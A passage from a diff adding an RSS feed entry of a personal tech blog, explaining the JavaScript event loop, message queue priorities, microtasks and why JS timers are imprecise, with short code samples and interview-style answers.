+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="kd">function&lt;/span> &lt;span class="nx">delay&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">duration&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">var&lt;/span> &lt;span class="nx">start&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">Date&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">now&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">while&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nb">Date&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">now&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="o">-&lt;/span> &lt;span class="nx">start&lt;/span> &lt;span class="o">&amp;lt;&lt;/span> &lt;span class="nx">duration&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">btn&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">onclick&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="kd">function&lt;/span> &lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">h1&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">textContent&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="s1">&amp;#39;Don’t want to Hello the World！&amp;#39;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">delay&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">3000&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">};&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;lt;/&lt;/span>&lt;span class="nt">script&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>After click the button, the h1 text will change after 3 seconds.&lt;/p>
+&lt;h3 id="priority-of-the-message-queue">Priority of the Message Queue&lt;/h3>
+&lt;p>Task don&amp;rsquo;t have priority, the message queue is FIFO (First In First Out).&lt;/p>
+&lt;p>But the message queue has priority.&lt;/p>
+&lt;p>According to Latest W3C standard:&lt;/p>
+&lt;ul>
+&lt;li>Every Task has a task type, the same task type must in the same queue, different task type must in different queue. In the Event Loop, browser will based on the task type to execute the task.&lt;/li>
+&lt;li>The browser must prepare a micro-queue, and tasks in the micro-queue are executed prior to all other tasks &lt;a class="link" href="https://html.spec.whatwg.org/multipage/webappapis.html#perform-a-microtask-checkpoint" target="_blank" rel="noopener"
+>https://html.spec.whatwg.org/multipage/webappapis.html#perform-a-microtask-checkpoint&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;blockquote>
+&lt;p>As the complexity of browsers has increased dramatically, the W3C no longer uses the term macro queue.&lt;/p>
+&lt;/blockquote>
+&lt;p>In the Chrome browser, the message queue is divided into various types:&lt;/p>
+&lt;ul>
+&lt;li>Timer Task Queue: used to store the callback task after the timer arrives, the priority is &amp;ldquo;medium&amp;rdquo;&lt;/li>
+&lt;li>User Interaction Task Queue: used to store the callback task after the user interaction event is triggered, the priority is &amp;ldquo;high&amp;rdquo;&lt;/li>
+&lt;li>Micro Task Queue: used to store micro tasks, the priority is &amp;ldquo;highest&amp;rdquo;&lt;/li>
+&lt;/ul>
+&lt;blockquote>
+&lt;p>Method to add micro task is to use &lt;code>Promise, MutationObserver&lt;/code>&lt;/p>
+&lt;p>Example:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-js" data-lang="js">&lt;span class="line">&lt;span class="cl">&lt;span class="c1">// Add a function to the micro task immediately
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1">&lt;/span>&lt;span class="nb">Promise&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">resolve&lt;/span>&lt;span class="p">().&lt;/span>&lt;span class="nx">then&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">fn&lt;/span>&lt;span class="p">)&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;/blockquote>
+&lt;blockquote>
+&lt;p>There are many other queues in the browser, which are not considered because they have little to do with our development&lt;/p>
+&lt;/blockquote>
+&lt;blockquote>
+&lt;p>Interview Question: Explain the event loop of JS&lt;/p>
+&lt;p>Answer:&lt;/p>
+&lt;p>&lt;strong>Event Loop&lt;/strong> a.k.a &lt;strong>Message Loop&lt;/strong>, is the way the browser&amp;rsquo;s rendering main thread works&lt;/p>
+&lt;p>In the Source Code of Chromium, it opens an endless for loop, and each loop will take the first task from the message queue and execute it, and other threads only need to add tasks to the end of the queue at the right time.&lt;/p>
+&lt;p>In the past, the message queue was simply divided into macro queues and micro queues. This statement is no longer applicable to the complex browser environment. Instead, it is a more flexible and changeable processing method.&lt;/p>
+&lt;p>According to the official explanation of W3C, each task has a different type, and tasks of the same type must be in the same queue, and tasks of different types can belong to different queues. Different task queues have different priorities. In one event loop, the browser can decide which queue to take tasks from according to the actual situation. However, the browser must have a micro queue, and the tasks in the micro queue must have the highest priority and must be scheduled for execution first.&lt;/p>
+&lt;/blockquote>
+&lt;blockquote>
+&lt;p>Interview Question: Can the timer in JS be accurate? Why?&lt;/p>
+&lt;p>Answer:&lt;/p>
+&lt;p>Cannot be accurate, because:&lt;/p>
+&lt;ol>
+&lt;li>Computer hardware does not have an atomic clock, so it cannot be timed accurately.&lt;/li>
+&lt;li>The timing function of the operating system itself has a small deviation. Since the timer of JS ultimately calls the function of the operating system, it also carries these deviations&lt;/li>
+&lt;li>According to the W3C standard, when the browser implements the timer, if the nesting level exceeds 5 layers, it will have a minimum time of 4 milliseconds, which will bring deviations when the timing time is less than 4 milliseconds&lt;/li>
+&lt;li>Affected by the event loop, the callback function of the timer can only run when the main thread is idle, which brings deviations again&lt;/li>
+&lt;/ol>
+&lt;/blockquote>
+&lt;p>&lt;img src="https://xph0816.github.io/p/event-loop/cover.png"
+width="1298"
+height="960"
+srcset="https://xph0816.github.io/p/event-loop/cover_hu6906da3f6e6f146e764f66363372123f_210693_480x0_resize_box_3.png 480w, https://xph0816.github.io/p/event-loop/cover_hu6906da3f6e6f146e764f66363372123f_210693_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="Screenshot of the Event Loop"
+class="gallery-image"
+data-flex-grow="135"
+data-flex-basis="324px"
+>&lt;/p></description></item></channel></rss>
